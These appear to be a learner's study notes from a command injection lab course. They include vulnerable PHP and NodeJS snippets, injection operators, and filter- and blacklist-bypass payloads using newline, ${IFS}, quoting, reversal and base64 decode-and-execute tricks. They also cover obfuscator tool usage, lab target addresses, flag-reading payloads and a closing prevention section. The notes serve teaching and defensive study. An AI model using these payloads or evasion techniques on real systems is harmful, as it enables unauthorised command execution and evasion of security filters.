# Intro to Command Injections

**PHP Example**

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

**NodeJS Example**

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

**Tools / Functions**

exec  
system  
shell_exec  
passthru  
popen  
child_process.exec  
child_process.spawn

**Paths**

/tmp/

**Parameters**

filename

**Endpoints**

/createfile

**Tables / Lists**

OS Command Injection  
Code Injection  
SQL Injections  
Cross-Site Scripting/HTML Injection

**Other Injection Types**

LDAP injection  
NoSQL Injection  
HTTP Header Injection  
XPath Injection  
IMAP Injection  
ORM Injection


# Detection 

**Observed Command Pattern**

```bash
ping -c 1 OUR_INPUT
```

**Injection Operators**

Semicolon  
;  
%3b

New Line  
\n  
%0a

Background  
&  
%26

Pipe  
|  
%7c

AND  
&&  
%26%26

OR  
||  
%7c%7c

Sub-Shell  
``  
%60%60

Sub-Shell  
$()  
%24%28%29

**Input Examples (Structure Only)**

IP_ADDRESSCOMMAND

**Tools / Utilities**

ping

**Interfaces**

Host Checker  
IP Address input field  
Check button

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
# Other Injection Operators

**Payloads**

```
127.0.0.1 && whoami
```

```
127.0.0.1 || whoami
```

```
|| whoami
```

**Executed Commands**

```bash
ping -c 1 127.0.0.1 && whoami
```

```bash
ping -c 1 127.0.0.1 || whoami
```

```bash
ping -c 1 || whoami
```

**Operators**  
&&  
||

**URL-Encoded Payloads**

```
127.0.0.1+%26%26+whoami
```

```
|+whoami
```

**Injection Operators Table**

SQL Injection  
' , ; -- /* */

Command Injection  
; &&

LDAP Injection

- ( ) & |
    

XPath Injection  
' or and not substring concat count

OS Command Injection  
; & |

Code Injection  
' ; -- /* */ $() ${} #{} %{} ^

Directory Traversal/File Path Traversal  
../ ..\ %00

Object Injection  
; & |

XQuery Injection  
' ; -- /* */

Shellcode Injection  
\x \u %u %n

Header Injection  
\n \r\n \t %0d %0a %09

**Targets**  
94.237.61.248:59431

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

# Identifying Filters 

**Blocked Payload**

```
127.0.0.1; whoami
```

**Character Test Payload**

```
127.0.0.1;
```

**URL-Encoded Payload**

```
127.0.0.1%3b
```

**Blacklisted Characters (Example)**

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

**Injection Operators To Test**

```
\n
&
|
```
# Bypassing Space Filters

**Injection Operator (Allowed)**

```
%0a
```

**Blocked Payload**

```
127.0.0.1%0a whoami
```

**Space Test Payload**

```
127.0.0.1%0a+whoami
```

**Tab Bypass**

```
%09
```

```
127.0.0.1%0a%09
```

**IFS Bypass**

```
${IFS}
```

```
127.0.0.1%0a${IFS}
```

**Brace Expansion (Local Test)**

```shell-session
farouqhassan00@htb[/htb]$ {ls,-la}
```

**Brace Expansion (Injection Form)**

```
127.0.0.1%0a{ls,-la}
```

**Commands Referenced**

```
whoami
```

```
ls -la
```

**External References**

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
```

```
127.0.0.1%0als${IFS}-la
```

# Bypassing Other Blacklisted Characters 

**Environment Variable Inspection**

```bash
echo ${PATH}
```

**Slash Extraction**

```bash
echo ${PATH:0:1}
```

**Semicolon Extraction**

```bash
echo ${LS_COLORS:10:1}
```

**Payload Using Environment Variables**

```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

**Windows CMD Slash Extraction**

```cmd
echo %HOMEPATH:~6,-11%
```

**Windows PowerShell Slash Extraction**

```powershell
$env:HOMEPATH[0]
```

```powershell
$env:PROGRAMFILES[10]
```

```powershell
Get-ChildItem Env:
```

**ASCII Reference**

```bash
man ascii
```

**Character Shifting (Linux)**

```bash
echo $(tr '!-}' '"-~'<<<[)
```

**Targets**

```
94.237.123.236:36391
```

```
ip=127.0.0.1%0als${IFS}${PATH:0:1}home
```
# Bypassing Blacklisted Commands

**Blocked Payload (Concept)**

```
127.0.0.1 whoami
```

**Example Command Blacklist (PHP)**

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

**Quote-Based Obfuscation (Linux & Windows)**

```bash
w'h'o'am'i
```

```bash
w"h"o"am"i
```

**Injection Payload (Quote Obfuscation)**

```
127.0.0.1%0aw'h'o'am'i
```

**Linux-Only Obfuscation**

```bash
who$@ami
```

```bash
w\ho\am\i
```

**Windows-Only Obfuscation**

```cmd
who^ami
```

cat /home/1nj3c70r/flag.txt
```
127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
# Advanced Command Obfuscation

**Case Manipulation (Windows)**

```powershell
WhOaMi
```

**Case Normalization (Linux)**

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

**Tab-Replaced Variant**

```
%09
```

**Alternative Case Normalization**

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

**Reverse String (Linux)**

```bash
echo 'whoami' | rev
```

**Execute Reversed Command (Linux)**

```bash
$(rev<<<'imaohw')
```

**Reverse String (Windows PowerShell)**

```powershell
"whoami"[-1..-20] -join ''
```

**Execute Reversed Command (Windows PowerShell)**

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

**Base64 Encode (Linux)**

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

**Base64 Decode & Execute (Linux)**

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Base64 Encode (Windows PowerShell)**

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

**Base64 Encode UTF-16 (Linux)**

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

**Base64 Decode & Execute (Windows PowerShell)**

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

**Target Command (Objective)**

```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
```

```
127.0.0.1%0a${IFS}bash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```
# Evasion Tools

**Linux Tool**  
[https://github.com/Bashfuscator/Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

**Clone & Install (Linux)**

```shell-session
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

**Invoke Help**

```shell-session
cd ./bashfuscator/bin/
./bashfuscator -h
```

**Basic Obfuscation**

```shell-session
./bashfuscator -c 'cat /etc/passwd'
```

**Controlled Obfuscation**

```shell-session
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

**Test Obfuscated Payload**

```shell-session
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

---

**Windows Tool**  
[https://github.com/danielbohannon/Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

**Clone & Load (Windows / PowerShell)**

```powershell-session
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

**Help Menu**

```powershell-session
help
```

**Set Payload**

```powershell-session
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

**Encoding Mode**

```powershell-session
encoding
1
```

**Obfuscated Output**

```cmd-session
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

**PowerShell on Linux**

```bash
pwsh
```

**PowerShell Installation Docs**  
[https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux)


# Command Injection Prevention

**PHP Built-In Alternative**

```php
fsockopen
```

**PHP Input Validation**

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

**JavaScript Regex Validation**

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

**PHP Input Sanitization**

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

**JavaScript Input Sanitization**

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

**NodeJS DOMPurify**

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

**Server Configuration Options**

mod_security  
Cloudflare  
Fortinet  
Imperva

www-data

disable_functions=system

open_basedir='/var/www/html'

Reject double-encoded requests  
Reject non-ASCII URLs


#
```
&from=51459716.txt

%26c'a't%09${PATH:0:1}flag.txt

&finish=1&move=1
```

#
#
#